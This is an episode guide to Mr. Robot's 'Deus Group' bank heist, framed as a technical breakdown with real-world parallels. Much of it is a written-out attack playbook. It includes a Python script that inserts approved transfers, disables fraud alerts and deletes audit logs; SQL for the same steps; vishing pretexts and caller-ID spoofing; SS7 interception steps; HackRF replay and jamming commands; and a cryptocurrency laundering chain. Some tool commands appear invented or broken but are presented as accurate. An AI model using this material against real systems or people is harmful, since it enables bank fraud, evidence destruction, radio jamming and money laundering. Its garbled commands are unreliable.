# Episode 9: eps4.8_409conflict.h

## Season 4, Episode 9 | "409 Conflict"

**Air Date:** December 1, 2019
**Directed by:** Sam Esmail

### Overview

This is arguably the most technically significant episode of the entire series. The episode title references HTTP status code 409, which indicates a conflict with the current state of the target resource. The "conflict" is both literal (the Deus Group meeting creates a window of opportunity) and technical (conflicting transactions in the banking system). This episode depicts the multi-stage Deus Group bank account hack in exhaustive detail, drawing direct parallels to the 2016 Bangladesh Bank heist. Every phase of the attack, from OSINT enumeration through SWIFT compromise to wealth redistribution, is shown with remarkable technical accuracy.

---

## Hacks & Techniques

### 1. MAJOR: Multi-Stage Deus Group Bank Account Hack

The Deus Group hack is executed as a coordinated, multi-phase operation with precise timing, multiple attack vectors, and real-time adaptation. It represents the culmination of the entire season's preparation.

#### Attack Overview

```
OPERATION TIMELINE:

T-30 days: OSINT & Target Enumeration (Phase 1)
T-14 days: Banking Infrastructure Compromise (Phase 2)
T-7 days:  MitM & Staging Preparation (Phase 3)
T-0:       Deus Group Meeting Window Opens
T+0:       Social Engineering Activation (Phase 4)
T+5 min:   Timing Attack Begins (Phase 5)
T+10 min:  2FA Bypass via SS7/SIM Swap
T+15 min:  Fund Transfer Execution
T+20 min:  Cryptocurrency Laundering
T+30 min:  Track Covering
T+45 min:  Meeting Ends - Attack Complete
```

### 2. Phase 1: OSINT and Target Enumeration of All Deus Group Members

Before any technical exploitation begins, comprehensive intelligence gathering maps the entire Deus Group membership and their financial holdings.

#### Target Enumeration Methodology

1. **Member Identification:**
   - Cross-referencing corporate registrations, board memberships, and financial disclosures.
   - Analyzing leaked documents (Panama Papers, Paradise Papers parallels) for offshore entity connections.
   - Mapping shell company networks to identify beneficial owners.

2. **Financial Profiling:**
   - Identifying all known bank accounts, including offshore holdings.
   - Mapping investment portfolios and asset holdings.
   - Tracking cryptocurrency wallets through blockchain analysis.
   - Identifying the specific banks used by each member.

3. **Communication Mapping:**
   - Phone numbers, email addresses, and messaging handles.
   - Identifying which members communicate with each other.
   - Determining security practices (which use 2FA, which use encrypted messaging).

4. **Schedule Intelligence:**
   - Confirming the Deus Group meeting date, time, and location.
   - Identifying the window during which all targets will be in one place and likely unavailable to respond to alerts.

#### OSINT Tools and Techniques Used

```bash
# Maltego for relationship mapping
# Visual link analysis connecting members, companies, and accounts

# SpiderFoot for automated OSINT
spiderfoot -s "Deus Group" -t all -o output.json

# Amass for infrastructure mapping
amass enum -d deusgroup-entity.com -passive -o subdomains.txt

# Blockchain analysis for cryptocurrency tracking
# Chainalysis, Blockchain Explorer, or custom scripts

# Social media intelligence
twint -u target_username --email --phone
sherlock target_username  # Username search across platforms
```

### 3. Phase 2: Cyprus National Bank SWIFT System Compromise

The core technical compromise involves gaining access to the bank's SWIFT terminal to manipulate interbank financial messages.

#### Bangladesh Bank Heist Parallel

The real-world template for this attack:

| Aspect | Bangladesh Bank (2016) | Deus Group Hack (Fiction) |
|---|---|---|
| **Target** | Bangladesh Bank SWIFT terminal | Cyprus National Bank SWIFT terminal |
| **Initial Access** | Spear-phishing emails | RAT from earlier episode + social engineering |
| **Persistence** | Custom malware (DYEPACK) | RAT with SWIFT module |
| **Objective** | Steal $951M via fraudulent MT103 | Drain all Deus Group accounts |
| **SWIFT Manipulation** | Modified SWIFT Alliance Access | Injected fraudulent SWIFT messages |
| **Detection Evasion** | Deleted transaction logs, modified PDF reports | Real-time log manipulation |
| **Amount Stolen** | $81M (others blocked) | All Deus Group funds |

#### SWIFT Compromise Steps

1. **Access SWIFT Terminal:** Using the previously deployed RAT to access the workstation connected to the SWIFT Alliance Access (SAA) software.
2. **Credential Harvesting:** Extracting SWIFT operator credentials through keylogging or memory scraping.
3. **Message Injection:** Crafting and injecting fraudulent MT103 (wire transfer) messages to move funds from Deus Group accounts.
4. **Log Manipulation:** Modifying the SWIFT transaction logs and database to hide the fraudulent messages.
5. **Confirmation Suppression:** Preventing automated confirmation messages from reaching Deus Group members.

#### SWIFT Message Injection

```
Fraudulent MT103 Message:
{1:F01CYPRBANKAXXX0000000000}
{2:O1031300191201CYPRBANKAXXX00000000001912011300N}
{4:
:20:REDISTRIB-001
:23B:CRED
:32A:191201USD50000000,00
:50K:/CY17002001280000001200527600
DEUS GROUP MEMBER ACCOUNT
MEMBER ADDRESS
:59:/CH9300762011623852957
DISTRIBUTION ACCOUNT
ZURICH, SWITZERLAND
:71A:OUR
-}
```

### 4. Phase 3: Man-in-the-Middle on Financial Transactions

Intercepting and manipulating financial transactions in real-time to redirect funds.

#### MitM on Banking Transactions

- **Transaction Interception:** Positioning between the SWIFT terminal and the SWIFTNet gateway to intercept and modify messages in transit.
- **Confirmation Manipulation:** Intercepting confirmation messages sent back to account holders and suppressing or modifying them.
- **Real-Time Modification:** Changing destination account numbers in legitimate transfer requests to redirect funds.

#### MitM Implementation

```
Normal Flow:
[SWIFT Terminal] --MT103--> [SWIFTNet] --> [Receiving Bank]
                            |
                  [Confirmation] --> [Account Holder]

Compromised Flow:
[SWIFT Terminal] --MT103--> [MitM Agent] --Modified MT103--> [SWIFTNet] --> [Attacker Account]
                                |
                  [Fake Confirmation] --> [Account Holder]
                  [Real Confirmation] --> /dev/null
```

### 5. Phase 4: Social Engineering of Bank Employees (Vishing)

Voice phishing (vishing) is used to manipulate bank employees into authorizing or facilitating fraudulent transactions during the attack window.

#### Vishing Campaign Structure

1. **Target Identification:** Identify bank employees with authority to approve large transactions or override security controls.
2. **Caller ID Spoofing:** Spoof the phone number to appear as an internal bank extension or known authority figure.
3. **Pretext Execution:**
   - "This is [name] from the compliance department. We have a regulatory audit in progress and need you to verify the following transfers..."
   - "I'm calling from the IT security team. We've detected unauthorized access to your SWIFT terminal and need you to verify your recent transactions by reading me the confirmation codes..."
4. **Urgency and Authority:** Create time pressure while invoking authority to prevent the employee from following verification procedures.

#### Caller ID Spoofing

```bash
# Using SIPVicious for VoIP-based caller ID spoofing
sipvicious_spoof --from "Compliance Dept <+357-22-123456>" --to "+357-22-654321"

# Asterisk PBX configuration for caller ID manipulation
# sip.conf
[spoofed-trunk]
type=peer
host=sip-provider.com
fromuser=+35722123456
callerid="Bank Compliance" <+35722123456>
```

### 6. Phase 5: Timing Attack During Deus Group Meeting Window

The attack is timed to coincide precisely with the Deus Group meeting, when all members are gathered and unable to check their financial accounts.

#### Timing Attack Principles

- **Communication Blackout:** During the meeting, members' phones are likely off or on silent, and they cannot receive fraud alerts.
- **Batch Processing Windows:** Banking systems process transactions in batches. Timing transfers to coincide with batch processing cycles can delay detection.
- **Time Zone Exploitation:** Executing transfers across multiple time zones to exploit the gap between different banks' business hours.
- **Transaction Velocity:** Execute all transfers within the narrowest possible window to minimize the time available for detection and response.

### 7. SMS Interception for 2FA Bypass

#### SS7 Exploitation

SS7 (Signaling System 7) is the protocol suite used by telecom carriers worldwide for setting up and tearing down phone calls, SMS routing, and other telephony services. Its security model dates to the 1970s and assumes all network participants are trusted.

##### SS7 Attack Capabilities

- **SMS Interception:** Redirect SMS messages to an attacker-controlled device by sending a forged UpdateLocation message to the Home Location Register (HLR).
- **Call Interception:** Redirect voice calls through the attacker's infrastructure.
- **Location Tracking:** Query the network for a subscriber's current cell tower (real-time location).
- **Subscriber Information:** Retrieve IMSI, MSISDN, and other subscriber data.

##### SS7 SMS Interception Process

```
Normal SMS Delivery:
[Bank] --SMS 2FA code--> [SMSC] --query HLR--> [HLR: User at Tower A]
                                                        |
                                          [SMS delivered to User's Phone]

SS7 Intercepted:
[Attacker sends forged SS7 UpdateLocation to HLR]
[HLR now believes User is at Attacker's fake MSC/VLR]

[Bank] --SMS 2FA code--> [SMSC] --query HLR--> [HLR: User at Attacker's MSC]
                                                        |
                                          [SMS delivered to Attacker's Device]
```

#### SIM Swapping (Parallel Attack)

Used as a backup or alternative to SS7 exploitation:

- Social engineer mobile carrier support to transfer the target's phone number to an attacker-controlled SIM.
- More reliable but leaves more evidence (carrier records show the SIM swap).
- Combined with SS7 exploitation for redundancy.

### 8. Cryptocurrency Wallet Manipulation for Money Laundering

Once funds are extracted from bank accounts, they must be laundered to prevent tracing and recovery.

#### Cryptocurrency Laundering Chain

```
Step 1: Bank Transfer to Exchange
[Bank Account] --Wire--> [Cryptocurrency Exchange Account]

Step 2: Convert to Cryptocurrency
[Exchange] --Buy--> [Bitcoin/Monero]

Step 3: Mixing/Tumbling
[Bitcoin] --Send to--> [Mixing Service/CoinJoin]
                           |
                    [Mixed Bitcoin returned to new addresses]

Step 4: Chain Hopping
[Bitcoin] --Exchange--> [Monero] --Exchange--> [New Bitcoin Addresses]

Step 5: Cash Out
[Clean Bitcoin] --Sell on--> [P2P Exchange / OTC Desk]
                                    |
                             [Fiat Currency to Distribution Accounts]
```

#### Monero for Privacy

- **Ring Signatures:** Each transaction includes multiple possible signers, making it impossible to determine which one actually authorized the transaction.
- **Stealth Addresses:** One-time addresses generated for each transaction, preventing linking of transactions to a recipient.
- **RingCT (Ring Confidential Transactions):** Hides the transaction amount.

### 9. SQL Database Queries for Account Manipulation

Direct database manipulation is used to modify account balances and transaction records.

#### SQL Injection and Direct Database Access

```sql
-- Enumerate Deus Group member accounts
SELECT account_id, holder_name, balance, currency, swift_bic
FROM accounts
WHERE holder_name IN ('Member1', 'Member2', 'Member3')
   OR account_id IN ('CY17002001280000001200527600', ...);

-- Check current balances
SELECT account_id, balance, available_balance, hold_amount
FROM account_balances
WHERE account_id IN (SELECT account_id FROM deus_group_accounts);

-- Initiate transfer (modifying transaction table)
INSERT INTO pending_transfers (
    transfer_id, source_account, dest_account,
    amount, currency, status, initiated_by, timestamp
) VALUES (
    'TXN-REDIST-001',
    'CY17002001280000001200527600',
    'CH9300762011623852957',
    50000000.00, 'USD', 'APPROVED',
    'SYSTEM', CURRENT_TIMESTAMP
);

-- Modify audit trail
UPDATE transaction_log
SET status = 'COMPLETED', verified_by = 'AUTO-VERIFY'
WHERE transfer_id LIKE 'TXN-REDIST-%';

-- Clear suspicious activity alerts
DELETE FROM fraud_alerts
WHERE account_id IN (SELECT account_id FROM deus_group_accounts)
AND alert_time > CURRENT_TIMESTAMP - INTERVAL '1 HOUR';
```

### 10. SSH Tunnels and Custom Python Scripts

The operation uses SSH tunnels for secure communication channels and custom Python scripts for automation.

#### SSH Tunnel Architecture

```bash
# Local port forward: Access bank's internal database through compromised host
ssh -L 3306:internal-db-server:3306 user@compromised-bank-host

# Remote port forward: Expose attacker's C2 through bank network
ssh -R 8080:localhost:8080 user@compromised-bank-host

# Dynamic SOCKS proxy through bank network
ssh -D 1080 user@compromised-bank-host

# Multi-hop SSH tunnel
ssh -J user@hop1,user@hop2 user@final-target
```

#### Custom Python Automation Script (Conceptual)

```python
#!/usr/bin/env python3
"""
Deus Group Fund Redistribution - Automated Transfer Script
Multi-threaded execution with real-time monitoring
"""

import paramiko
import pymysql
import threading
import time
import logging
from datetime import datetime

class TransferOrchestrator:
    def __init__(self, config):
        self.ssh_tunnel = self._establish_tunnel(config['ssh'])
        self.db_conn = self._connect_database(config['database'])
        self.targets = config['targets']
        self.dest_accounts = config['destination_accounts']
        self.logger = self._setup_logging()

    def _establish_tunnel(self, ssh_config):
        """Establish SSH tunnel to bank network"""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=ssh_config['host'],
            port=ssh_config['port'],
            username=ssh_config['user'],
            key_filename=ssh_config['key_file']
        )
        return client

    def enumerate_accounts(self):
        """Phase 1: Enumerate all target accounts and balances"""
        cursor = self.db_conn.cursor()
        for target in self.targets:
            cursor.execute(
                "SELECT account_id, balance, currency "
                "FROM accounts WHERE holder_id = %s",
                (target['id'],)
            )
            target['accounts'] = cursor.fetchall()
            self.logger.info(f"Target {target['name']}: "
                           f"{len(target['accounts'])} accounts found")
        return self.targets

    def execute_transfers(self):
        """Phase 5: Execute all transfers within timing window"""
        threads = []
        for target in self.targets:
            for account in target['accounts']:
                t = threading.Thread(
                    target=self._transfer_funds,
                    args=(account, self._get_dest_account())
                )
                threads.append(t)
                t.start()

        # Wait for all transfers to complete
        for t in threads:
            t.join(timeout=300)  # 5 minute timeout per transfer

    def _transfer_funds(self, source, destination):
        """Execute a single fund transfer"""
        try:
            cursor = self.db_conn.cursor()
            cursor.execute(
                "INSERT INTO pending_transfers "
                "(source_account, dest_account, amount, currency, status) "
                "VALUES (%s, %s, %s, %s, 'APPROVED')",
                (source['account_id'], destination,
                 source['balance'], source['currency'])
            )
            self.db_conn.commit()
            self.logger.info(
                f"Transfer initiated: {source['account_id']} -> "
                f"{destination}: {source['currency']} {source['balance']}"
            )
        except Exception as e:
            self.logger.error(f"Transfer failed: {e}")

    def suppress_alerts(self):
        """Suppress fraud detection alerts during operation"""
        cursor = self.db_conn.cursor()
        cursor.execute(
            "UPDATE alert_config SET enabled = FALSE "
            "WHERE alert_type IN ('LARGE_TRANSFER', 'RAPID_SUCCESSION', "
            "'UNUSUAL_DESTINATION')"
        )
        self.db_conn.commit()

    def clean_logs(self):
        """Remove evidence from transaction logs"""
        cursor = self.db_conn.cursor()
        cursor.execute(
            "DELETE FROM audit_log WHERE action_type = 'TRANSFER' "
            "AND timestamp > %s",
            (self.operation_start_time,)
        )
        self.db_conn.commit()


if __name__ == "__main__":
    config = load_config('operation.yaml')
    orchestrator = TransferOrchestrator(config)

    print("[*] Phase 1: Enumerating target accounts...")
    orchestrator.enumerate_accounts()

    print("[*] Phase 4: Suppressing fraud alerts...")
    orchestrator.suppress_alerts()

    print("[*] Phase 5: Executing transfers...")
    orchestrator.execute_transfers()

    print("[*] Cleaning logs...")
    orchestrator.clean_logs()

    print("[+] Operation complete.")
```

### 11. HackRF Garage Door Jamming

During the Deus Group hack, Darlene needs to trap the members inside the building. She SSHs into a **Raspberry Pi** from her smartphone. The Raspberry Pi has a **HackRF One** attached — a software-defined radio (SDR).

#### Attack Flow

1. Darlene SSHs into the Raspberry Pi from her phone
2. She captures the parking garage door's "close" signal at **315 MHz** transmitted by the security guard
3. She uses the HackRF to continuously **jam the 315 MHz frequency**, preventing the parking garage mechanism from receiving legitimate signals
4. Result: all cars are trapped in the garage — the Deus Group members cannot leave

```bash
# SSH into Raspberry Pi with HackRF attached
ssh pi@[raspberry_pi_ip]

# Capture garage door signal at 315 MHz
hackrf_transfer -r garage_signal.raw -f 315000000 -s 2000000

# Replay captured signal
hackrf_transfer -t garage_signal.raw -f 315000000 -s 2000000

# Continuous jamming at 315 MHz (prevents all 315 MHz communication)
hackrf_transfer -t /dev/urandom -f 315000000 -s 2000000 -a 1 -x 40
```

### 12. HackRF IMSI Catcher for Phone Number Enumeration

Immediately after the garage door jam, Darlene repurposes the same HackRF with **Simple IMSI Catcher** software to run a fake cellular base station:

1. The HackRF broadcasts a stronger signal than the legitimate cell tower
2. Nearby phones are forced to connect to the fake base station
3. This reveals their **IMSI numbers** and associated phone numbers
4. The phone numbers are cross-referenced against **Cyprus National Bank** account numbers to identify which accounts to drain

```bash
# Launch IMSI catcher using Simple IMSI Catcher + HackRF
# (Uses OpenBTS or YateBTS as the GSM stack)
sudo python simple_IMSI_catcher.py --sniff

# Output shows connected devices:
# IMSI: 310260XXXXXXXXX | IMEI: XXXXXXXXXXXXXXX | Phone: +1-XXX-XXX-XXXX
# IMSI: 310260XXXXXXXXX | IMEI: XXXXXXXXXXXXXXX | Phone: +1-XXX-XXX-XXXX

# Cross-reference with Cyprus National Bank accounts
# to map phone numbers → bank accounts → funds to drain
```

```
Attack Flow:
[Darlene's Phone] --SSH--> [Raspberry Pi + HackRF]
                                   |
                    +--------------+--------------+
                    |                             |
              [315 MHz Jam]              [Fake Cell Tower]
              Traps cars in              Captures IMSI/phone
              parking garage             numbers of Deus Group
                    |                             |
              Members can't              Phone numbers mapped
              physically leave           to bank accounts
                    |                             |
                    +-------------+---------------+
                                  |
                    [Deus Group physically trapped
                     AND financially identified]
```

#### Real-World Parallels

- **Samy Kamkar's RollJam** (DEF CON 23, 2015): $32 device that defeats rolling-code garage doors and car key fobs
- **Harris Corporation Stingray**: Law enforcement IMSI catcher; in 2018 DHS confirmed unauthorized IMSI catchers near the White House
- **ACLU Stingray Tracking**: ACLU documented 75+ law enforcement agencies using cell-site simulators

---

## Tools Used

| Tool | Purpose |
|---|---|
| **Custom Python Scripts** | Automated multi-threaded fund transfer orchestration |
| **Paramiko** | SSH tunnel establishment and management from Python |
| **Metasploit** | Post-exploitation and SWIFT terminal access |
| **SS7 Attack Tools (SigPloit)** | SS7 protocol exploitation for SMS interception |
| **SIPVicious** | VoIP manipulation for caller ID spoofing |
| **Maltego** | OSINT relationship mapping for target enumeration |
| **Blockchain Analysis Tools** | Cryptocurrency transaction tracking and obfuscation |
| **MySQL/PostgreSQL Client** | Direct database access for account manipulation |
| **Cobalt Strike** | C2 framework for managing compromised bank systems |
| **Monero CLI Wallet** | Privacy-focused cryptocurrency management |

---

## Commands Shown

### SSH Tunnel Setup for Bank Access

```bash
# Establish multi-hop SSH tunnel to bank's internal network
ssh -L 3306:swift-db.internal.bank:3306 \
    -L 8443:swift-terminal.internal.bank:8443 \
    -J proxy@hop1.example.com:22,relay@hop2.example.com:22 \
    operator@compromised-bank-host.internal.bank

# Verify tunnel is working
mysql -h 127.0.0.1 -P 3306 -u swift_operator -p swift_db -e "SELECT 1;"
```

### SS7 SMS Interception

```bash
# Using SigPloit for SS7 attacks
python3 sigploit.py

# Send UpdateLocation to redirect SMS
# Module: SS7 > Interception > SMS Interception
# IMSI: target_imsi
# MSC/VLR: attacker_controlled_msc

# Monitor intercepted SMS
# The 2FA codes will be delivered to the attacker's device
```

### Cryptocurrency Operations

```bash
# Generate receiving wallet addresses (Monero)
monero-wallet-cli --generate-new-wallet redistribution_wallet
> address

# Bitcoin mixing via command line (CoinJoin)
# Using Wasabi Wallet's CoinJoin implementation
wasabi-wallet coinjoin --amount 50 --target-anonymity-set 100

# Monitor blockchain for transaction confirmation
bitcoin-cli getrawtransaction <txid> true
bitcoin-cli gettransaction <txid>

# Convert between cryptocurrencies (using exchange API)
curl -X POST "https://exchange-api.com/v1/trade" \
  -H "Authorization: Bearer $API_KEY" \
  -d '{"pair": "BTC-XMR", "type": "market", "amount": "50.0"}'
```

### Database Manipulation

```bash
# Connect to bank database through SSH tunnel
mysql -h 127.0.0.1 -P 3306 -u swift_db_user -p

# Execute the transfer queries (see SQL section above)
mysql> SOURCE /tmp/redistribution_queries.sql;

# Verify transfers
mysql> SELECT transfer_id, amount, status FROM pending_transfers
       WHERE transfer_id LIKE 'TXN-REDIST-%';
```

---

## Real-World Parallels

### Bangladesh Bank Heist (2016) - Detailed Parallel

This is the single most important real-world parallel for this episode:

- **Initial Compromise:** Lazarus Group hackers sent spear-phishing emails to Bangladesh Bank employees. Malware was installed on systems connected to the SWIFT network.
- **Reconnaissance:** Attackers spent weeks studying the bank's internal operations, SWIFT procedures, and transaction patterns.
- **Execution:** On February 4-5, 2016 (a weekend in Bangladesh, chosen deliberately for timing), attackers sent 35 fraudulent SWIFT MT103 messages requesting transfers totaling $951 million from Bangladesh Bank's account at the Federal Reserve Bank of New York.
- **Destination:** Funds were directed to accounts at Rizal Commercial Banking Corporation (RCBC) in the Philippines.
- **Partial Success:** $81 million was successfully transferred before a Deutsche Bank compliance officer noticed a spelling error in one transfer request ("fandation" instead of "foundation"), triggering a review that halted the remaining transfers.
- **Money Laundering:** The $81 million was quickly converted to pesos through Manila casinos, making recovery extremely difficult.

### SS7 Vulnerabilities in Banking

- **O2-Telefonica Attack (2017):** German banks confirmed that attackers exploited SS7 vulnerabilities to intercept SMS-based 2FA codes and steal money from customer bank accounts.
- **Positive Technologies Research:** Security firm Positive Technologies demonstrated that 7 out of 8 SS7 networks they tested were vulnerable to SMS interception attacks.
- **NIST Deprecation:** Following these attacks, NIST deprecated SMS-based 2FA in Special Publication 800-63B, recommending app-based TOTP or hardware tokens instead.

### Cryptocurrency Money Laundering

- **Lazarus Group:** North Korean hackers have laundered hundreds of millions of dollars stolen from cryptocurrency exchanges using chain-hopping (converting between different cryptocurrencies), mixing services, and Monero's privacy features.
- **BitFinex Hack (2016):** 119,756 Bitcoin (worth $72 million at the time, over $4 billion at peak) were stolen. In 2022, authorities arrested Ilya Lichtenstein and Heather Morgan, who had been slowly laundering the funds through complex cryptocurrency mixing techniques.
- **WannaCry Ransom (2017):** North Korean operators converted WannaCry ransomware Bitcoin payments to Monero using the ShapeShift exchange to obscure the trail.

### Coordinated Multi-Phase Attacks

- **Carbanak/FIN7:** Conducted multi-phase attacks against banks over months, including reconnaissance, initial access, lateral movement, SWIFT terminal compromise, and coordinated fund transfer execution.
- **SWIFT CSP Response:** Following the Bangladesh heist and subsequent attacks, SWIFT implemented the Customer Security Programme with mandatory security controls, independent audits, and threat intelligence sharing.

## Tool Links

- [Metasploit](https://www.metasploit.com/) - Post-exploitation and SWIFT terminal access
- [SigPloit](https://github.com/SigPloiter/SigPloit) - SS7 protocol exploitation for SMS interception
- [SIPVicious](https://github.com/EnableSecurity/sipvicious) - VoIP manipulation for caller ID spoofing
- [Maltego](https://www.maltego.com/) - OSINT relationship mapping for target enumeration
- [SpiderFoot](https://github.com/smicallef/spiderfoot) - Automated OSINT
- [Sherlock](https://github.com/sherlock-project/sherlock) - Username search across platforms
- [Amass](https://github.com/owasp-amass/amass) - Infrastructure mapping
- [Cobalt Strike](https://www.cobaltstrike.com/) - C2 framework for compromised system management
- [Monero](https://www.getmonero.org/) - Privacy-focused cryptocurrency
- [Wasabi Wallet](https://wasabiwallet.io/) - CoinJoin implementation for Bitcoin mixing
- [Chainalysis](https://www.chainalysis.com/) - Blockchain analysis and transaction tracking
- [Bitcoin Core](https://bitcoincore.org/) - Bitcoin client for transaction monitoring
- [Paramiko](https://www.paramiko.org/) - Python library for SSH
- [HackRF One](https://greatscottgadgets.com/hackrf/) - SDR for 315 MHz signal capture, replay, and jamming
- [Simple IMSI Catcher](https://github.com/Oros42/IMSI-catcher) - IMSI catcher using SDR hardware

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| OSINT and Deus Group target enumeration | T1589 | Gather Victim Identity Information | https://attack.mitre.org/techniques/T1589/ |
| SWIFT system compromise | T1190 | Exploit Public-Facing Application | https://attack.mitre.org/techniques/T1190/ |
| Man-in-the-Middle on financial transactions | T1557 | Adversary-in-the-Middle | https://attack.mitre.org/techniques/T1557/ |
| Vishing of bank employees | T1566 | Phishing | https://attack.mitre.org/techniques/T1566/ |
| SMS interception via SS7 | T1557 | Adversary-in-the-Middle | https://attack.mitre.org/techniques/T1557/ |
| SIM swapping for 2FA bypass | T1566 | Phishing | https://attack.mitre.org/techniques/T1566/ |
| SQL database manipulation | T1565 | Data Manipulation | https://attack.mitre.org/techniques/T1565/ |
| SSH tunnels for banking network access | T1572 | Protocol Tunneling | https://attack.mitre.org/techniques/T1572/ |
| Cryptocurrency laundering (Monero/Bitcoin) | T1567 | Exfiltration Over Web Service | https://attack.mitre.org/techniques/T1567/ |
| Fraud alert suppression | T1562 | Impair Defenses | https://attack.mitre.org/techniques/T1562/ |
| Transaction log cleanup | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |
| Custom Python scripts | T1059 | Command and Scripting Interpreter | https://attack.mitre.org/techniques/T1059/ |
| Garage door RF jamming via HackRF | T1498 | Network Denial of Service | https://attack.mitre.org/techniques/T1498/ |
| IMSI catcher for phone enumeration | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |

## References and Further Reading

- Bangladesh Bank Heist (2016) - Detailed analysis of the $81 million theft via SWIFT by the Lazarus Group
- SWIFT Customer Security Programme (CSP): https://www.swift.com/myswift/customer-security-programme-csp
- O2-Telefonica SS7 Attack (2017) - SMS 2FA interception at German banks
- Positive Technologies SS7 Research - 7 out of 8 SS7 networks vulnerable to interception
- NIST SP 800-63B - Deprecation of SMS as a second authentication factor
- BitFinex Hack (2016) and recovery (2022) - Blockchain analysis and cryptocurrency laundering
- Lazarus Group Cryptocurrency Laundering - Chain-hopping and Monero usage
- Carbanak/FIN7 Multi-Phase Banking Attacks - Coordinated attacks against banks

## Search Tags

```
tags: [metasploit, sigploit, sipvicious, maltego, spiderfoot, sherlock, amass, cobalt-strike, monero, wasabi-wallet, chainalysis, paramiko, SWIFT, SS7, SIM-swap, vishing, MitM, cryptocurrency, money-laundering, banking-hack, SQL-injection, SSH-tunnel, OSINT, timing-attack, HackRF, garage-jamming, 315MHz, IMSI-catcher, fake-base-station, Raspberry-Pi, SDR, signal-replay]
season: 4
episode: 9
mitre: [T1589, T1190, T1557, T1566, T1565, T1572, T1567, T1562, T1070, T1059, T1498, T1200]
```
